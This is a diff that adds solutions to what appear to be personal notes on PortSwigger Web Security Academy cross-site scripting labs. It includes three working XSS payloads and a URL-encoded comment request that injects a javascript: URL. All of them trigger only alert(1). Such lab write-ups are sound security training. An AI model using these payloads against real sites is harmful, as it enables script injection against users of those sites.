@@ -99,13 +99,23 @@ Solution:
 
     https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
 
+Payload: `" autofocus onfocus="alert(1)`
+
 ### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
 
     https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
 
+Payload: `javascript:alert(1)`
+
+Solution (encoded comment's request body):
+
+    csrf=0U6uy5VkRelkARZmhPEM6i1Gg6xBgqq3&postId=8&comment=QWE&name=QWE&email=abc%40xyz.com&website=javascript%3Aalert%281%29
+
 ### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
     https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
+
+Payload: `';alert(1)//`
 
 ## OAuth authentication
 
